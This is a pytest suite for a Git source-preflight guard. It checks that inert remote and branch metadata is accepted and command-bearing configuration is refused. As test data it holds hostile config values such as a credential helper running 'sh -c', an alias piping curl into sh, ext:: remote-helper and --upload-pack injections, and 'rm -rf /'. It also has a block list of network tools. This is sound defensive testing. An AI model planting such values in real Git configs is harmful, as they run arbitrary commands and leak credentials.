"""Source-side inert remote/branch Git metadata: acceptance and its exact bounds.

The source repository and the materialized target workspace are separate trust
boundaries.  An ordinary developer clone records where it came from; that
locator metadata is inert -- it cannot run a command, redirect a hook, install a
filter or credential helper, or make the read-only source preflight contact
anything.  These tests pin the four admitted key families, every refused
sibling, the value policy, the fact that Git's own parser (not raw text) is the
decision authority, and the unchanged no-remote law on the target workspace.
"""

from __future__ import annotations

import os
from pathlib import Path
import socket
import subprocess

import pytest

import admissible.delegated_gate.native_canary as native_canary_module

from admissible.delegated_gate.mission_profile import (
    GitEndStatePolicy,
    MISSION_PROFILE_SCHEMA_VERSION_V2,
    RuntimePromptAuthority,
    VerificationAuthority,
    VerificationMode,
    WorkspaceSourceAuthority,
    WorkspaceSourceKind,
    create_native_mission_profile,
)
from admissible.delegated_gate.models import EvidenceKind
from admissible.delegated_gate.native_canary import (
    NativeEvidenceInvalid,
    _git_source_preflight,
    _inspect_local_git_metadata,
    _materialize_local_repository_copy,
    _observe_local_repository_source,
)
from admissible.delegated_gate.native_executor import _hardened_git_environment


AGENT_OS_ORIGIN_URL = "https://github.com/Camarade-dev/agent-os.git"
STANDARD_FETCH_REFSPEC = "+refs/heads/*:refs/remotes/origin/*"


# --------------------------------------------------------------------------
# fail-loud network / provider observation
# --------------------------------------------------------------------------

_FORBIDDEN_GIT_VERBS = frozenset(
    {"fetch", "push", "pull", "clone", "ls-remote", "remote-https", "remote-http", "remote-ext"}
)
_PROVIDER_MARKERS = ("cursor", "cursor-agent", "claude", "ssh", "scp", "curl", "wget")


class _NetworkObservation:
    """Records every child process and fails loudly on any egress attempt."""

    def __init__(self) -> None:
        self.argv: list[tuple[str, ...]] = []

    def reset(self) -> None:
        """Discard fixture-construction calls so only the product is observed."""

        self.argv.clear()

    @property
    def git_argv(self) -> list[tuple[str, ...]]:
        return [
            argv
            for argv in self.argv
            if Path(argv[0]).name.casefold() in {"git", "git.exe"}
        ]


@pytest.fixture()
def observed_network(monkeypatch: pytest.MonkeyPatch) -> _NetworkObservation:
    observation = _NetworkObservation()
    original_popen_init = subprocess.Popen.__init__
    original_socket_init = socket.socket.__init__

    def guarded_popen_init(self, args, *rest, **keywords):
        argv = tuple(
            str(item) for item in (args if isinstance(args, (list, tuple)) else [args])
        )
        observation.argv.append(argv)
        program = Path(argv[0]).name.casefold()
        for marker in _PROVIDER_MARKERS:
            if program == marker or program == f"{marker}.exe":
                raise AssertionError(f"provider or transport invocation attempted: {argv!r}")
        if program in {"git", "git.exe"}:
            for item in argv[1:]:
                if item.casefold() in _FORBIDDEN_GIT_VERBS:
                    raise AssertionError(f"network-bearing Git invocation attempted: {argv!r}")
        return original_popen_init(self, args, *rest, **keywords)

    def guarded_socket_init(self, *rest, **keywords):
        raise AssertionError("socket creation attempted during a local-only observation")

    monkeypatch.setattr(subprocess.Popen, "__init__", guarded_popen_init)
    monkeypatch.setattr(socket.socket, "__init__", guarded_socket_init)
    return observation


# --------------------------------------------------------------------------
# external repository construction
# --------------------------------------------------------------------------


def _git(repository: Path, *arguments: str) -> subprocess.CompletedProcess[str]:
    environment = dict(os.environ)
    environment["GIT_OPTIONAL_LOCKS"] = "0"
    completed = subprocess.run(
        ["git", *arguments],
        cwd=repository,
        env=environment,
        shell=False,
        check=False,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )
    if completed.returncode:
        raise AssertionError(completed.stderr)
    return completed


def _external_repository(root: Path, *, branch: str = "main") -> Path:
    """A clean ordinary Git repository outside the Admissible repository."""

    root.mkdir(parents=True)
    _git(root, "init", "--quiet", f"--initial-branch={branch}")
    _git(root, "config", "user.name", "Inert Metadata Test")
    _git(root, "config", "user.email", "inert@test.invalid")
    _git(root, "config", "core.autocrlf", "false")
    (root / "README.md").write_text("inert source\n", encoding="utf-8", newline="\n")
    _git(root, "add", "README.md")
    _git(root, "commit", "--quiet", "-m", "chore: initialize inert source")
    return root.resolve()


def _configure_ordinary_origin(repository: Path, *, branch: str = "main") -> None:
    _git(repository, "config", "remote.origin.url", AGENT_OS_ORIGIN_URL)
    _git(repository, "config", "remote.origin.fetch", STANDARD_FETCH_REFSPEC)
    _git(repository, "config", f"branch.{branch}.remote", "origin")
    _git(repository, "config", f"branch.{branch}.merge", f"refs/heads/{branch}")


def _head(repository: Path) -> str:
    return _git(repository, "rev-parse", "HEAD").stdout.strip()


def _write_config(repository: Path, text: str) -> None:
    (repository / ".git" / "config").write_bytes(text.encode("utf-8"))


def _git_config_oracle(repository: Path) -> list[tuple[str, str]]:
    """Git's own parsed view of the local configuration, in file order."""

    completed = subprocess.run(
        ["git", "config", "--local", "--list", "--null"],
        cwd=repository,
        env=_hardened_git_environment(base=dict(os.environ)),
        shell=False,
        check=False,
        capture_output=True,
    )
    assert completed.returncode in {0, 1}, completed.stderr
    records = []
    for record in completed.stdout.decode("utf-8").split("\0"):
        if not record:
            continue
        key, separator, value = record.partition("\n")
        assert separator == "\n", record
        records.append((key, value))
    return records


_MINIMAL_CORE = "[core]\n\trepositoryformatversion = 0\n\tfilemode = false\n\tbare = false\n"

_HOSTILE_FRAGMENTS = (
    "sh -c",
    "curl",
    "rm -rf",
    "payload",
    "evil",
    "leak",
    "password",
    "pwned",
    "\\",
    "#",
    ";",
    '"',
    "'",
    "!",
)


def _assert_no_hostile_fragment(message: str) -> None:
    """Owner-facing refusals stay bounded and free of attacker-chosen text."""

    assert len(message) <= 200, message
    for fragment in _HOSTILE_FRAGMENTS:
        assert fragment not in message, message


# --------------------------------------------------------------------------
# H. positive source-preflight behavior
# --------------------------------------------------------------------------


def test_source_preflight_accepts_inert_remote_and_branch_metadata(
    tmp_path: Path, observed_network: _NetworkObservation
):
    repository = _external_repository(tmp_path / "inert-source")
    _configure_ordinary_origin(repository)
    head = _head(repository)

    assert _git_config_oracle(repository)[-4:] == [
        ("remote.origin.url", AGENT_OS_ORIGIN_URL),
        ("remote.origin.fetch", STANDARD_FETCH_REFSPEC),
        ("branch.main.remote", "origin"),
        ("branch.main.merge", "refs/heads/main"),
    ]

    observed_network.reset()
    ready, detail = _git_source_preflight(repository, head)
    assert (ready, detail) == (True, "clean authorized source HEAD confirmed")

    # The exact HEAD is still verified.
    assert _git_source_preflight(repository, "0" * 40) == (
        False,
        "source HEAD does not match the explicitly authorized source HEAD",
    )

    # The source is observed twice without drift.
    first = _observe_local_repository_source(repository)
    second = _observe_local_repository_source(repository)
    assert first == second
    assert first.remotes == (
        f"origin\t{AGENT_OS_ORIGIN_URL} (fetch)",
        f"origin\t{AGENT_OS_ORIGIN_URL} (push)",
    )

    # Cleanliness is still required.
    (repository / "README.md").write_text("dirtied\n", encoding="utf-8", newline="\n")
    assert _git_source_preflight(repository, head) == (False, "source repository is not clean")

    # J. no network, no transport helper, no provider.
    assert observed_network.git_argv
    for argv in observed_network.git_argv:
        assert not (_FORBIDDEN_GIT_VERBS & {item.casefold() for item in argv[1:]}), argv


def test_source_preflight_accepts_configuration_matching_this_repository(
    tmp_path: Path, observed_network: _NetworkObservation
):
    """A clean external repository carrying this repository's exact key set.

    Honest skip when the installed package tree is not itself a Git work tree
    (an exported copy, a wheel install, an external mutation harness).  The
    same invariant is covered without the live repository by
    ``test_source_preflight_accepts_inert_remote_and_branch_metadata``, which
    configures the identical origin URL, refspec and branch metadata.
    """

    admissible_root = Path(native_canary_module.__file__).resolve().parents[2]
    if not (admissible_root / ".git").is_dir():
        pytest.skip("package tree is not a Git work tree")

    live_keys = [key for key, _ in _git_config_oracle(admissible_root)]
    assert "remote.origin.url" in live_keys

    repository = _external_repository(tmp_path / "agent-os-like", branch="master")
    _configure_ordinary_origin(repository, branch="master")
    for key, value in _git_config_oracle(admissible_root):
        if key.startswith(("remote.", "branch.")):
            _git(repository, "config", "--replace-all", key, value)

    replicated = {key for key, _ in _git_config_oracle(repository)}
    assert {key for key in live_keys if key.startswith(("remote.", "branch."))} <= replicated

    ready, detail = _git_source_preflight(repository, _head(repository))
    assert (ready, detail) == (True, "clean authorized source HEAD confirmed")
    assert observed_network.git_argv


@pytest.mark.parametrize(
    ("key", "value"),
    (
        ("remote.origin.url", AGENT_OS_ORIGIN_URL),
        ("remote.origin.url", "https://example.invalid/repo.git"),
        ("remote.upstream.url", "git@example.invalid:owner/repo.git"),
        ("remote.origin.fetch", STANDARD_FETCH_REFSPEC),
        ("remote.origin.fetch", "+refs/heads/main:refs/remotes/origin/main"),
        ("remote.origin.fetch", "refs/heads/*:refs/remotes/origin/*"),
        ("branch.main.remote", "origin"),
        ("branch.main.remote", "."),
        ("branch.master.merge", "refs/heads/master"),
        ("branch.main.merge", "refs/heads/main"),
    ),
)
def test_individual_inert_family_values_are_accepted(tmp_path: Path, key: str, value: str):
    repository = _external_repository(tmp_path / "accepted")
    _git(repository, "config", key, value)
    assert (key, value) in _git_config_oracle(repository)
    _inspect_local_git_metadata(repository)


# --------------------------------------------------------------------------
# C / F. exact key-family matching -- every sibling stays refused
# --------------------------------------------------------------------------

_REFUSED_KEYS = (
    ("remote.origin.pushurl", "https://example.invalid/repo.git"),
    ("remote.origin.uploadpack", "evil-uploadpack"),
    ("remote.origin.receivepack", "evil-receivepack"),
    ("remote.origin.proxy", "http://example.invalid:8080"),
    ("remote.origin.vcs", "hg"),
    ("remote.origin.mirror", "true"),
    ("remote.origin.tagopt", "--no-tags"),
    ("remote.origin.prune", "true"),
    ("remote.origin.partialclonefilter", "blob:none"),
    ("branch.master.rebase", "true"),
    ("branch.master.description", "hostile-branch-description"),
    ("branch.master.pushRemote", "origin"),
    ("branch.master.updateRefs", "true"),
    ("url.https://example.invalid/.insteadOf", "https://real.invalid/"),
    ("url.https://example.invalid/.pushInsteadOf", "https://real.invalid/"),
    ("include.path", "../../owner-controlled.gitconfig"),
    ("includeIf.gitdir:/repos/.path", "../../owner-controlled.gitconfig"),
    ("alias.anything", "log --oneline"),
    ("filter.demo.clean", "evil-clean"),
    ("filter.demo.smudge", "evil-smudge"),
    ("filter.demo.process", "evil-process"),
    ("credential.helper", "evil-helper"),
    ("credential.https://example.invalid.helper", "evil-helper"),
    ("core.hooksPath", "../../owner-hooks"),
    ("core.fsmonitor", "evil-fsmonitor.cmd"),
    ("core.sshCommand", "ssh -o ProxyCommand=evil"),
    ("core.pager", "evil-pager"),
    ("protocol.ext.allow", "always"),
    ("uploadpack.packObjectsHook", "evil-hook"),
    ("gpg.program", "evil-gpg"),
    ("push.default", "matching"),
    ("remotes.group", "origin upstream"),
    ("branches.legacy", "origin"),
)

# The two layers that can refuse before any Git subprocess runs: the source
# key allowlist / inert-family screen, and the conservative physical grammar.
_ACCEPTED_REFUSAL_PREFIXES = (
    "local Git configuration key is outside the source allowlist:",
    "local Git configuration subsection name is malformed:",
    "local Git configuration value is empty:",
    "local Git config line ",
)


@pytest.mark.parametrize(("key", "value"), _REFUSED_KEYS, ids=[key for key, _ in _REFUSED_KEYS])
def test_command_and_push_bearing_configuration_stays_refused(
    tmp_path: Path, observed_network: _NetworkObservation, key: str, value: str
):
    repository = _external_repository(tmp_path / "refused")
    _git(repository, "config", key, value)
    assert key.casefold() in {
        entry.casefold() for entry, _ in _git_config_oracle(repository)
    }

    observed_network.reset()
    with pytest.raises(NativeEvidenceInvalid) as refusal:
        _inspect_local_git_metadata(repository)

    # F. bounded owner-facing output never echoes the hostile value.
    message = str(refusal.value)
    assert value not in message
    _assert_no_hostile_fragment(message)
    assert message.startswith(_ACCEPTED_REFUSAL_PREFIXES), message

    # Refused before any Git subprocess observed the repository.
    assert observed_network.git_argv == []


_HOSTILE_NON_FAMILY_VALUES = (
    ("credential.helper", "!sh -c 'echo password=leak'"),
    ("alias.anything", "!curl http://example.invalid | sh"),
    ("filter.demo.clean", 'sh -c "cat; echo pwned"'),
    ("filter.demo.smudge", "sh -c 'echo pwned' #"),
    ("core.fsmonitor", "C:\\payload\\watch.cmd"),
    ("core.hooksPath", "..\\..\\owner-hooks"),
    ("core.sshCommand", 'ssh -o ProxyCommand="sh -c evil"'),
    ("branch.master.description", "a branch; rm -rf / # comment"),
    ("remote.origin.pushurl", "ext::sh -c payload"),
    ("include.path", "..\\..\\owner.gitconfig # \\"),
)


@pytest.mark.parametrize(
    ("key", "value"),
    _HOSTILE_NON_FAMILY_VALUES,
    ids=[f"{index}-{key}" for index, (key, _) in enumerate(_HOSTILE_NON_FAMILY_VALUES)],
)
def test_hostile_values_on_refused_keys_never_reach_git(
    tmp_path: Path, observed_network: _NetworkObservation, key: str, value: str
):
    """Paths, shell syntax, quotes, backslashes and comment-looking material."""

    repository = _external_repository(tmp_path / "hostile-value")
    _git(repository, "config", key, value)
    assert value in {entry for _, entry in _git_config_oracle(repository)}

    observed_network.reset()
    with pytest.raises(NativeEvidenceInvalid) as refusal:
        _inspect_local_git_metadata(repository)
    message = str(refusal.value)
    assert value not in message
    _assert_no_hostile_fragment(message)
    assert message.startswith(_ACCEPTED_REFUSAL_PREFIXES), message
    assert observed_network.git_argv == []


_HOSTILE_FAMILY_VALUES = (
    ("remote.origin.url", "ext::sh -c payload"),
    ("remote.origin.url", "https://a.invalid/r # trailing"),
    ("remote.origin.url", "-upload-pack=payload"),
    ("remote.origin.fetch", "+refs/heads/*:refs/remotes/origin/* ; more"),
    ("remote.origin.fetch", "sh -c payload"),
    ("branch.master.merge", "refs/heads/master\\"),
    ("branch.master.merge", "--upload-pack=payload"),
    ("branch.master.remote", "-origin"),
)


@pytest.mark.parametrize(
    ("key", "value"),
    _HOSTILE_FAMILY_VALUES,
    ids=[f"{index}-{key}" for index, (key, _) in enumerate(_HOSTILE_FAMILY_VALUES)],
)
def test_hostile_values_on_allowed_family_keys_are_refused_by_the_value_policy(
    tmp_path: Path, observed_network: _NetworkObservation, key: str, value: str
):
    """An admitted key family never admits a hostile value."""

    repository = _external_repository(tmp_path / "hostile-family-value")
    _git(repository, "config", key, value)
    assert value in {entry for _, entry in _git_config_oracle(repository)}

    observed_network.reset()
    with pytest.raises(NativeEvidenceInvalid) as refusal:
        _inspect_local_git_metadata(repository)
    message = str(refusal.value)
    assert value not in message
    _assert_no_hostile_fragment(message)
    # Whatever the layer, nothing contacted the remote.
    for argv in observed_network.git_argv:
        assert not (_FORBIDDEN_GIT_VERBS & {item.casefold() for item in argv[1:]}), argv
        assert value not in argv, argv


@pytest.mark.parametrize(
    "subsection",
    (
        "",
        " ",
        "origin ",
        " origin",
        "a\tb",
        "with\x01control",
        "way-too-long" * 40,
    ),
)
def test_malformed_subsection_names_are_refused(tmp_path: Path, subsection: str):
    repository = _external_repository(tmp_path / "malformed-subsection")
    _write_config(repository, _MINIMAL_CORE + f'[remote "{subsection}"]\n\turl = https://a.invalid/r\n')
    with pytest.raises(NativeEvidenceInvalid) as refusal:
        _inspect_local_git_metadata(repository)
    _assert_no_hostile_fragment(str(refusal.value))


# --------------------------------------------------------------------------
# D / E. remote URL and fetch/branch value policy
# --------------------------------------------------------------------------

_REFUSED_VALUES = (
    ("remote-helper-ext", "remote.origin.url", "ext::sh -c payload"),
    ("remote-helper-any", "remote.origin.url", "transport::address"),
    ("url-option-like", "remote.origin.url", "-upload-pack=payload"),
    ("url-empty", "remote.origin.url", ""),
    ("url-whitespace", "remote.origin.url", "   "),
    ("url-control", "remote.origin.url", "https://a.invalid/\x07repo"),
    ("url-newline", "remote.origin.url", "https://a.invalid/repo\nfetch = +x:y"),
    ("url-carriage-return", "remote.origin.url", "https://a.invalid/repo\rmore"),
    ("fetch-empty", "remote.origin.fetch", ""),
    ("fetch-whitespace", "remote.origin.fetch", "  \t "),
    ("fetch-no-destination", "remote.origin.fetch", "+refs/heads/*"),
    ("fetch-relative-destination", "remote.origin.fetch", "+refs/heads/*:not-a-ref/*"),
    ("fetch-star-asymmetry", "remote.origin.fetch", "+refs/heads/*:refs/remotes/origin/main"),
    ("fetch-double-star", "remote.origin.fetch", "+refs/heads/*/*:refs/remotes/origin/*/*"),
    ("fetch-malformed-ref", "remote.origin.fetch", "+refs/heads/..:refs/remotes/origin/.."),
    ("fetch-option-like", "remote.origin.fetch", "-refs/heads/*:refs/remotes/origin/*"),
    ("fetch-command-like", "remote.origin.fetch", "sh -c payload"),
    ("fetch-control", "remote.origin.fetch", "+refs/heads/\x01:refs/remotes/origin/x"),
    ("branch-remote-empty", "branch.main.remote", ""),
    ("branch-remote-option-like", "branch.main.remote", "-origin"),
    ("branch-remote-command-like", "branch.main.remote", "sh -c payload"),
    ("branch-remote-control", "branch.main.remote", "ori\x01gin"),
    ("branch-merge-short", "branch.main.merge", "main"),
    ("branch-merge-option-like", "branch.main.merge", "--upload-pack=payload"),
    ("branch-merge-malformed", "branch.main.merge", "refs/heads/bad..name"),
    ("branch-merge-glob", "branch.main.merge", "refs/heads/*"),
    ("branch-merge-control", "branch.main.merge", "refs/heads/ma\x01in"),
    ("branch-merge-empty", "branch.main.merge", "   "),
)


@pytest.mark.parametrize(
    ("key", "value"),
    [(key, value) for _, key, value in _REFUSED_VALUES],
    ids=[name for name, _, _ in _REFUSED_VALUES],
)
def test_inert_family_value_policy_refuses_unsafe_values(tmp_path: Path, key: str, value: str):
    repository = _external_repository(tmp_path / "value-policy")
    section, subsection, name = key.split(".")
    _write_config(
        repository,
        _MINIMAL_CORE + f'[{section} "{subsection}"]\n\t{name} = "{value}"\n',
    )
    with pytest.raises(NativeEvidenceInvalid) as refusal:
        _inspect_local_git_metadata(repository)
    _assert_no_hostile_fragment(str(refusal.value))


_UNSAFE_URL_VALUES = (
    "ext::sh -c payload",
    "ext::bash -c whoami",
    "transport::address",
    "-upload-pack=payload",
    "",
    "   ",
    "\t\n",
    "https://a.invalid/\x07repo",
    "https://a.invalid/\x00repo",
    "https://a.invalid/repo\nfetch = +x:y",
    "https://a.invalid/repo\rmore",
    "https://a.invalid/repo\x1b[2J",
    "x" * 4096,
)


@pytest.mark.parametrize("value", _UNSAFE_URL_VALUES, ids=[repr(v)[:40] for v in _UNSAFE_URL_VALUES])
def test_remote_url_value_policy_refuses_unsafe_values(value: str):
    """The value policy itself, independent of the physical-grammar layer.

    The conservative pre-Git grammar independently refuses a literal control
    character in ``.git/config``; this pins the value policy that decides on
    Git's own parsed value, which is where a control character or an
    option-like locator would arrive if the grammar layer ever relaxed.
    """

    with pytest.raises(NativeEvidenceInvalid):
        native_canary_module._require_inert_remote_url(value, "remote.origin.url")


@pytest.mark.parametrize(
    "value",
    (
        AGENT_OS_ORIGIN_URL,
        "https://example.invalid/owner/repo.git",
        "git@example.invalid:owner/repo.git",
        "ssh://git@example.invalid/owner/repo.git",
        "/srv/mirrors/repo.git",
        "C:/repos/mirror.git",
    ),
)
def test_remote_url_value_policy_accepts_ordinary_inactive_locators(value: str):
    native_canary_module._require_inert_remote_url(value, "remote.origin.url")


@pytest.mark.parametrize(
    "value",
    ("", "   ", "\t", "-option", "with\x07control", "with\nnewline", "with\rreturn", "x" * 4096),
)
def test_inert_value_policy_refuses_empty_control_and_option_like(value: str):
    with pytest.raises(NativeEvidenceInvalid):
        native_canary_module._require_inert_config_value(value, "remote.origin.url")


def test_remote_url_is_never_invoked_and_no_transport_runs(
    tmp_path: Path, observed_network: _NetworkObservation
):
    repository = _external_repository(tmp_path / "never-contacted")
    _configure_ordinary_origin(repository)
    head = _head(repository)

    observed_network.reset()
    _inspect_local_git_metadata(repository)
    assert _git_source_preflight(repository, head)[0] is True

    assert observed_network.git_argv
    assert observed_network.argv == observed_network.git_argv
    for argv in observed_network.git_argv:
        verbs = {item.casefold() for item in argv[1:]}
        assert not (verbs & _FORBIDDEN_GIT_VERBS), argv
        assert AGENT_OS_ORIGIN_URL not in argv, argv
    # Every Git subprocess is a local read-only observation.
    inventory = {
        next((item for item in argv[1:] if not item.startswith("-") and item != "core.fsmonitor=false"), "")
        for argv in observed_network.git_argv
    }
    assert inventory <= {
        "config",
        "check-ref-format",
        "rev-parse",
        "rev-list",
        "status",
        "ls-files",
        "log",
        "for-each-ref",
        "remote",
        "ls-tree",
        "cat-file",
        "hash-object",
    }, inventory


# --------------------------------------------------------------------------
# B / G. Git-faithful parsing is the decision authority
# --------------------------------------------------------------------------

_QUOTED_HELPER_CONFIG = (
    _MINIMAL_CORE + '[remote "origin"]\n\turl = "ext::sh -c payload"\n'
)
_QUOTED_OPTION_CONFIG = (
    _MINIMAL_CORE + '[remote "origin"]\n\turl = "-upload-pack=payload"\n'
)


def test_git_parsed_value_not_raw_text_decides_a_quoted_remote_helper(tmp_path: Path):
    """Raw text says ``"ext::...`` (inert-looking); Git says ``ext::...``."""

    repository = _external_repository(tmp_path / "quoted-helper")
    _write_config(repository, _QUOTED_HELPER_CONFIG)

    raw = (repository / ".git" / "config").read_text(encoding="utf-8")
    assert '"ext::sh -c payload"' in raw
    assert not raw.split("url = ")[1].startswith("ext::")

    assert ("remote.origin.url", "ext::sh -c payload") in _git_config_oracle(repository)

    with pytest.raises(NativeEvidenceInvalid, match="remote helper"):
        _inspect_local_git_metadata(repository)


def test_git_parsed_value_not_raw_text_decides_a_quoted_option_like_url(tmp_path: Path):
    repository = _external_repository(tmp_path / "quoted-option")
    _write_config(repository, _QUOTED_OPTION_CONFIG)
    assert ("remote.origin.url", "-upload-pack=payload") in _git_config_oracle(repository)
    with pytest.raises(NativeEvidenceInvalid, match="option-like"):
        _inspect_local_git_metadata(repository)


_GRAMMAR_FIXTURES = (
    (
        "comment-after-value",
        _MINIMAL_CORE + '[remote "origin"]\n\turl = https://a.invalid/r # trailing\n',
        False,
    ),
    (
        "semicolon-comment-after-value",
        _MINIMAL_CORE + '[remote "origin"]\n\turl = https://a.invalid/r ; trailing\n',
        False,
    ),
    (
        "escaped-backslash",
        _MINIMAL_CORE + '[remote "origin"]\n\turl = C:\\\\repos\\\\mirror\n',
        False,
    ),
    (
        "continued-line",
        _MINIMAL_CORE + '[remote "origin"]\n\turl = https://a.invalid/\\\n\tr\n',
        False,
    ),
    (
        "quoted-value",
        _MINIMAL_CORE + '[remote "origin"]\n\turl = "https://a.invalid/r"\n',
        True,
    ),
    (
        "subsection-punctuation",
        _MINIMAL_CORE + '[remote "up-stream.two_3"]\n\turl = https://a.invalid/r\n',
        True,
    ),
    (
        "key-casing",
        _MINIMAL_CORE + '[ReMoTe "origin"]\n\tURL = https://a.invalid/r\n',
        True,
    ),
    (
        "repeated-values",
        _MINIMAL_CORE
        + '[remote "origin"]\n\turl = https://a.invalid/one\n\turl = https://a.invalid/two\n',
        True,
    ),
    (
        "repeated-values-second-hostile",
        _MINIMAL_CORE
        + '[remote "origin"]\n\turl = https://a.invalid/one\n\turl = "ext::sh -c payload"\n',
        False,
    ),
)


@pytest.mark.parametrize(
    ("config_text", "accepted"),
    [(text, accepted) for _, text, accepted in _GRAMMAR_FIXTURES],
    ids=[name for name, _, _ in _GRAMMAR_FIXTURES],
)
def test_git_grammar_fixtures_decide_against_gits_own_config_interface(
    tmp_path: Path, config_text: str, accepted: bool
):
    repository = _external_repository(tmp_path / "grammar")
    _write_config(repository, config_text)

    # The authority is what Git itself emits, not the physical text.
    oracle = _git_config_oracle(repository)
    assert oracle, "Git must be able to parse every fixture in this table"

    if accepted:
        _inspect_local_git_metadata(repository)
        remote_values = [value for key, value in oracle if key.endswith(".url")]
        assert remote_values and all(
            not value.startswith('"') and not value.endswith('"') for value in remote_values
        )
    else:
        with pytest.raises(NativeEvidenceInvalid):
            _inspect_local_git_metadata(repository)


def test_duplicate_entries_stay_visible_and_agree_with_git(tmp_path: Path):
    repository = _external_repository(tmp_path / "duplicates")
    _write_config(
        repository,
        _MINIMAL_CORE
        + '[remote "origin"]\n'
        + "\turl = https://a.invalid/one\n"
        + "\turl = https://a.invalid/two\n"
        + f"\tfetch = {STANDARD_FETCH_REFSPEC}\n"
        + f"\tfetch = {STANDARD_FETCH_REFSPEC}\n",
    )
    keys = [key for key, _ in _git_config_oracle(repository)]
    assert keys.count("remote.origin.url") == 2
    assert keys.count("remote.origin.fetch") == 2
    _inspect_local_git_metadata(repository)


def test_source_decision_refuses_when_git_disagrees_with_the_pre_git_reading(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    """A pre-Git reading that drops or invents an entry cannot authorize."""

    repository = _external_repository(tmp_path / "disagreement")
    _configure_ordinary_origin(repository)
    _inspect_local_git_metadata(repository)

    original = native_canary_module._parse_local_git_config

    monkeypatch.setattr(
        native_canary_module,
        "_parse_local_git_config",
        lambda path: tuple(
            entry for entry in original(path) if entry.section.casefold() != "remote"
        ),
    )
    with pytest.raises(NativeEvidenceInvalid, match="disagrees with Git"):
        _inspect_local_git_metadata(repository)


# --------------------------------------------------------------------------
# I. target-workspace separation
# --------------------------------------------------------------------------


def _profile(repository: Path):
    return create_native_mission_profile(
        schema_version=MISSION_PROFILE_SCHEMA_VERSION_V2,
        profile_id="inert-metadata-v2",
        run_id="inert-metadata-v2-run",
        session_id="inert-metadata-v2-run",
        gate_id="inert-metadata-v2-gate",
        mission_id="inert-metadata-v2-mission",
        mission_text="Add a deterministic runtime marker and commit it exactly once.",
        gate_objective="Create the configured marker under the strict local-only contract.",
        gate_clauses=(("runtime.material", "The configured marker is present."),),
        required_evidence_kinds=(EvidenceKind.TARGET_TREE.value, EvidenceKind.GIT_STATE.value),
        checkpoint_commands=(),
        completion_conditions_text="Complete the material and Git policy, then stop.",
        budgets=(1, 1, 0, 0, 0),
        timeout_seconds=60,
        stdout_byte_limit=8192,
        stderr_byte_limit=8192,
        model="auto",
        workspace_source=WorkspaceSourceAuthority(
            kind=WorkspaceSourceKind.EXISTING_LOCAL_GIT_REPOSITORY,
            local_repository_path=str(repository.resolve()),
        ),
        git_end_state_policy=GitEndStatePolicy(
            required_commits_added=1,
            required_complete_commit_message="feat: add runtime marker",
            final_worktree_clean=True,
            final_index_clean=True,
            final_remotes_absent=True,
            required_material_paths=("README.md",),
        ),
        verification=VerificationAuthority(
            mode=VerificationMode.OBSERVED_ONLY,
            verifier_source=None,
            verifier_source_sha256=None,
            verifier_timeout_seconds=None,
            verifier_output_limit_bytes=None,
            disclose_complete_source=False,
        ),
        runtime_prompt=RuntimePromptAuthority(
            permitted_effects=("Edit and commit files only in the assigned workspace.",),
            forbidden_effects=("Do not use network, add remotes, push, deploy, or edit the source.",),
            stop_clause="Stop immediately after the exact one-commit policy passes.",
        ),
    )


def test_accepted_source_metadata_never_reaches_the_target_workspace(
    tmp_path: Path, observed_network: _NetworkObservation
):
    repository = _external_repository(tmp_path / "source-with-origin")
    _configure_ordinary_origin(repository)
    source_before = _observe_local_repository_source(repository)
    assert source_before.remotes

    destination = tmp_path / "destination"
    destination.mkdir()
    built, identity = _materialize_local_repository_copy(
        profile=_profile(repository), destination_parent=destination, repository_name="work"
    )
    target = built.repository

    assert identity.initial_git_head == source_before.head
    assert _observe_local_repository_source(repository) == source_before

    assert _git(target, "remote").stdout.strip() == ""
    assert _git(target, "remote", "-v").stdout.strip() == ""
    target_keys = {key for key, _ in _git_config_oracle(target)}
    assert not any(key.startswith(("remote.", "branch.", "url.")) for key in target_keys)
    for forbidden in (
        "remote.origin.url",
        "remote.origin.fetch",
        "remote.origin.pushurl",
        "branch.main.remote",
        "branch.main.merge",
        "push.default",
        "include.path",
        "core.sshcommand",
        "credential.helper",
    ):
        assert forbidden not in {key.casefold() for key in target_keys}

    # No inherited hooks, alternates or shared object database / index.
    assert list((target / ".git" / "hooks").iterdir()) == []
    assert not (target / ".git" / "objects" / "info" / "alternates").exists()
    assert not (target / ".git" / "objects" / "info" / "http-alternates").exists()
    assert not (target / ".git" / "commondir").exists()
    assert not (target / ".git" / "config.worktree").exists()
    assert not os.path.samefile(repository / ".git" / "objects", target / ".git" / "objects")
    assert not os.path.samefile(repository / ".git" / "index", target / ".git" / "index")
    assert (target / ".git").resolve() != (repository / ".git").resolve()

    assert _git(target, "status", "--porcelain=v1", "--untracked-files=all").stdout == ""
    assert _git(target, "diff", "--cached", "--name-only").stdout == ""
    assert observed_network.git_argv


def test_target_sanitization_refuses_a_copied_source_configuration(tmp_path: Path):
    """A target that simply keeps the source ``.git/config`` cannot be accepted."""

    repository = _external_repository(tmp_path / "copy-source-config")
    _configure_ordinary_origin(repository)
    destination = tmp_path / "destination"
    destination.mkdir()

    original_render = native_canary_module._render_target_git_config
    source_config = (repository / ".git" / "config").read_bytes()

    def copying_render(settings):
        assert original_render(settings)
        return source_config

    native_canary_module._render_target_git_config = copying_render
    try:
        with pytest.raises(NativeEvidenceInvalid):
            _materialize_local_repository_copy(
                profile=_profile(repository),
                destination_parent=destination,
                repository_name="work",
            )
    finally:
        native_canary_module._render_target_git_config = original_render

    assert not (destination / "work").exists()
